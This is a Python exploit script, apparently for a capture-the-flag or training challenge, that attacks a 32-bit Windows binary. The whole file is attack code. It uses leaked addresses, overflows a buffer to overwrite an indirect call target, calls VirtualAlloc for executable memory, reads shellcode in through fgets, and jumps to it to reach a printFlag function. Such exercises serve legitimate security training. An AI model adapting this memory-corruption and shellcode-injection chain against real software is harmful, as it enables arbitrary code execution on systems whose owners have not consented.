
from pwintools import *

SIZEOF_PTR = 4
OFFS_MINUS_4 = 128 - (4 - 2) * SIZEOF_PTR # this is the offset to inject the call target with binary operator
OP_MINUS_4 = bytes([b'*'[0] - 4*2]) # this is the binary operator that allows to jump to injected call target
OFFS_BIG_MINUS_2 = 128 - 2 * SIZEOF_PTR # this is the offset to inject the call target with 5-operands operator
BIGOP_MINUS_2 = bytes([b'?'[0] - 2]) # this is the 5-operands operator that allows to jump to injected call target

p = Process('2_indirect_calls_vs_32.exe')

p.set_timeout(1000 * 60 * 60 * 24)
#input('press enter after attaching the debugger')

# collect free leaks
p.recvuntil(b'is at ')
input = p.recvuntil(b'\r\n')

printFlagAddr = int(input[:8], 16)

p.recvuntil(b'is at ')
input = p.recvuntil(b'\r\n')

virtualAllocAddr = int(input[:8], 16)

print('printFlag is', hex(printFlagAddr))
print('VirtualAlloc is', hex(virtualAllocAddr))

# math time
base = printFlagAddr - 0x1030
stdcallToCdecl4Addr = base + 0x1000
acrtIobFuncAddr = base + 0xC930
fgetsAddr = base + 0xCC60

# prepare the shellcode to inject
# f = open('TMP', 'rb')
# shellcode = f.read()
# f.close()
shellcode = asm('mov eax, ' + str(printFlagAddr) + '; jmp eax', 32)

# phase 1: allocate memory
# invoke a 5-param function with the operator with index -2
smolPayload = (
	BIGOP_MINUS_2
	+ bytes(str(virtualAllocAddr), 'ascii')
	+ b' 0 ' # addr
	+ bytes(str(len(shellcode)), 'ascii') # size
	+ b' '
	+ bytes(str(MEM_COMMIT | MEM_RESERVE), 'ascii')
	+ b' '
	# + bytes(str(PAGE_EXECUTE_READWRITE), 'ascii') # <= this yields 'PAGE_EXECUTE_READWRITE' as string...
	+ bytes(str(0 + PAGE_EXECUTE_READWRITE), 'ascii')
)
#print('smolPayload is', smolPayload)
p.recvuntil(b' numbers\r\n')
print('allocating memory...')
p.sendline(
	smolPayload
	+ b'a' * (OFFS_BIG_MINUS_2 - len(smolPayload))
	+ p32(stdcallToCdecl4Addr)
)

p.recvuntil(b'result is ')
input = p.recvuntil(b'\r\n')
#print('allocated memory hint:', input)
allocatedMem = int(input[:-2], 10)
print('allocated memory at', hex(allocatedMem))

# phase 2: fetch stdin = __acrt_iob_func(0)
p.recvuntil(b' numbers\r\n')
print('fetching stdin...')
p.sendline(
	b'0'
	+ OP_MINUS_4
	+ b'9 '
	+ b'a' * (OFFS_MINUS_4 - 4)
	+ p32(acrtIobFuncAddr)
)

p.recvuntil(b'result is ')
input = p.recvuntil(b'\r\n')
stdin = int(input[:-2], 10)
print('fetched stdin:', stdin)

# phase 3: inject shellcode
smolPayload = (
	BIGOP_MINUS_2
	+ bytes(str(allocatedMem), 'ascii') # addr
	+ b' 4096 ' # maxSize
	+ bytes(str(stdin), 'ascii') # stream
	+ b' 0 0'
)
p.recvuntil(b' numbers\r\n')
print('triggering shellcode read...')
p.sendline(
	smolPayload
	+ b'a' * (OFFS_BIG_MINUS_2 - len(smolPayload))
	+ p32(fgetsAddr)
)

# actual injection
print('injecting shellcode now')
p.sendline(shellcode)

# phase 4: jump to shellcode
p.recvuntil(b' numbers\r\n')
print('jumping to shellcode...')
p.sendline(
	b'0'
	+ OP_MINUS_4
	+ b'0 '
	+ b'a' * (OFFS_MINUS_4 - 4)
	+ p32(allocatedMem)
)

p.interactive()

